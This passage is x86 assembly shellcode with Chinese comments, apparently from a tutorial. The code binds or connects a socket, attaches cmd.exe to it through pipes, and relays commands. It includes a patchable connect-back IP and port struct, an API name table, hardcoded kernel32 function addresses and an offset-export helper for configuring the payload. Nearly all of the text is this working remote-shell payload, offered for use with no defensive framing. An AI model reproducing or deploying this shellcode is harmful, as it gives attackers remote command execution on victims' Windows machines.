    ;//SOCKET _Create_Bind_Connect_Socket_To_Port( SkOverflowFuncAddr *pFuncAddr, szShellNeedFunc *pNeedFunc);

    push edi;

    push esi;

    call _Create_Bind_Connect_Socket_To_Port;

    add esp, 8;


    test eax, eax;

    jz Main_Quit_Now; //socket 失败.


    lea edi, [ebp-Shell_Cmd_Pipe_OFFSET];

    lea ebx, [edi + Shell_Cmd_Pipe.msocket];

    mov [ebx], eax; //保存结果到 msocket中.

   

    ;//BOOL _Create_Two_Pipe( SkOverflowFuncAddr *pFuncAddr, Shell_Cmd_Pipe *pCmdPipe);

    ;//创建2个pipe,用来绑定shell.

    push edi;

    push esi;

    call _Create_Two_Pipe;

    add esp, 8;


    test eax, eax;

    jz Main_Quit_Now;


    ;//now is ok.

    ;//在管套 pipe 上，运行进程 pStrCmd;

    ;//_Create_Process_To_Handle( SkOverflowFuncAddr *pFuncAddr, Shell_Cmd_Pipe *pCmdPipe, LPCTSTR *pStrCmd);

    lea edi, [ebp-szShellNeedFunc_OFFSET];

    xor eax,eax;

    mov al, String_Of_Data_Offset; //cmd.exe命令行在数据中的偏移.

    add edi, eax;

    push edi; //"cmd.exe"的指针

    lea edi, [ebp-Shell_Cmd_Pipe_OFFSET];

    push edi;

    push esi;

    call _Create_Process_To_Handle;

    add esp, 0ch;


    ;//接受管套的数据，写进pipe,读pipe,发送到socket.

    ;//_Recv_Write_Socket_Pipe(  SkOverflowFuncAddr *pFuncAddr, Shell_Cmd_Pipe *pCmdPipe);

    push edi;

    push esi;

    call _Recv_Write_Socket_Pipe;

    add esp, 8;


    ;//关闭不再用的管套

    ;//_Close_All_Communication_Pipe(SkOverflowFuncAddr *pFuncAddr, Shell_Cmd_Pipe *pCmdPipe);

    push edi;

    push esi;

    call _Close_All_Communication_Pipe

    add esp, 8;


    ;//关闭该进程

    xor eax, eax;

    push eax;

    lea edx, [edi+Shell_Cmd_Pipe.ProcessInformation];

    mov eax, [edx+PROCESS_INFORMATION.hProcess];

    push eax;


    mov eax, [esi+SkOverflowFuncAddr.TerminateProcess];

    call eax;


Main_Quit_Now: ;//现在推出..

    ;//exit now.

    xor eax, eax;

    push eax;

    mov eax, [esi+ SkOverflowFuncAddr.ExitProcess];

    call eax;


    ret;

;//quit_return:

    ;//恢复堆栈

    mov esp,ebp;

    pop ebp;

    nop;

    nop;


;//下面是数据: 

MyDataOffset equ $-call_back_Data_Offset; //call 函数,到这里的距离.


ConnectTypeOffset equ $-start;

ListenPortOffset equ ConnectTypeOffset+stConnectInfo.dwListenPort;

ConnectIP1Offset equ ConnectTypeOffset+stConnectInfo.dwIP1;

ConnectIP2Offset equ ConnectTypeOffset+stConnectInfo.dwIP2;

ConnectPortOffset equ ConnectTypeOffset+stConnectInfo.dwConnectPort;


MyConnectInfo stConnectInfo < 2, 0ffh, 0ffffh, 02010151h, 01250201h, 01a801c0h, 02010158h>


String_Of_Data_Offset equ $-MyConnectInfo;

ExecCommandOffset equ $-start;


szShellNeedFunc db 'cmd.exe+++++++++'

db '++++++++++++++++'

db '++++++++++++++++'

db '++++++++++++++++'

db '++++++++++++++++'

db '++++++++++++++++'

db '++++++++++++++++'

db '++++++++++++++++'


;//下面是函数信息.

SHELL_NEED_FUNC_BODY_OFFSET equ $-szShellNeedFunc;//这个是shell函数和dll的偏移


db 02h

db 0eh, 'kernel32.dll+',    '+'

db 0eh

db 11h, 'TerminateProcess', '+'

db 0bh,  'CreatePipe',   '+'

db 10h, 'GetStartupInfoA',   '+'

db 0fh, 'CreateProcessA',   '+'

db 0eh, 'PeekNamedPipe',   '+'

db 0ch, 'GlobalAlloc',  '+'

db 0bh, 'WriteFile',  '++'

db 09h, 'ReadFile',  '+'

db 06h, 'Sleep',  '+'

db 0ch, 'ExitProcess',  '+'

db 0eh, 'GetLastError+', '+'

db 10h, 'DuplicateHandle', '+'

db 12h, 'GetCurrentProcess', '+'

db 0ch, 'CloseHandle','+'

db 0bh, 'ws2_32.dll', '+'

db 0bh

db 07h, 'socket',  '+'

db 05h, 'bind',  '+'

db 07h, 'listen',  '+'

db 07h, 'accept',  '+'

db 05h, 'send',  '+'

db 05h, 'recv',  '+'

db 0bh, 'setsockopt', '+'

db 0bh, 'WSAStartup', '+'

db 0ch, 'closesocket', '+'

db 08h, 'connect', '+'

db 0ch, 'gethostname', '+'

db '+++++++++++++++++++++'


_GetModuleHandle_Addr_Offset equ $-szShellNeedFunc

GetModuleHandleOffset equ $-start;


GetModuleHandleA_Addr dd 77e756dbh


GetProcAddressOffset equ $-start;

GetProcAddressA_Addr dd 77e7564bh


_size_szShellNeedFunc equ $-szShellNeedFunc+1

_size_AllData equ $-MyConnectInfo+1


_sk_Bind_ConnectShellCode endp


db '---------------------------------------------------------'

;//重要数据在代码中的偏移

stDataSetOffset struct

  dwConnectType DD 0;

  dwListenPort DD 0;

  dwConnectIP1 DD 0;

  dwConnectIP2 DD 0;

  dwConnectPort DD 0;


  dwExecCommand DD 0;

  wSizeExecCommand DW 0;

  wReserv1 DW 0

  dwGetModuleHandle DD 0;

  dwGetProcAddress DD 0;

stDataSetOffset ends


_GetDataSetOffset_Value proc

  push ebp;

  mov ebp, esp;


  push esi;

  push edi;

  push edx;

  push ecx;

  push ebx;

  push eax;


  mov esi, FUNC_PARAM_1;


  lea edi, [esi+stDataSetOffset.dwConnectType];

  mov eax, ConnectTypeOffset;

  mov [edi], eax;


  lea edi, [esi+stDataSetOffset.dwListenPort];

  mov eax, ListenPortOffset;

  mov [edi], eax;


  lea edi, [esi+stDataSetOffset.dwConnectIP1];

  mov eax, ConnectIP1Offset;

  mov [edi], eax;


  lea edi, [esi+stDataSetOffset.dwConnectIP2];

  mov eax, ConnectIP2Offset;

  mov [edi], eax;


  lea edi, [esi+stDataSetOffset.dwConnectPort];

  mov eax, ConnectPortOffset;

  mov [edi], eax;


  lea edi, [esi+stDataSetOffset.dwExecCommand];

  mov eax, ExecCommandOffset;

  mov [edi], eax;


  lea edi, [esi+stDataSetOffset.wSizeExecCommand];

  mov ax, SHELL_NEED_FUNC_BODY_OFFSET;

  mov [edi], eax;


  lea edi, [esi+stDataSetOffset.dwGetModuleHandle];

  mov eax, GetModuleHandleOffset;

  mov [edi], eax;


  lea edi, [esi+stDataSetOffset.dwGetProcAddress];

  mov eax, GetProcAddressOffset;

  mov [edi], eax;


  pop eax;

  pop ebx;

  pop ecx;

  pop edx;

  pop edi;

  pop esi;


  mov esp, ebp;

  pop ebp;

  ret;


_GetDataSetOffset_Value endp


     end


----完---- 


读者如果是看不明白程序的流程，或者有关程序的地方，请自己多多摸索。
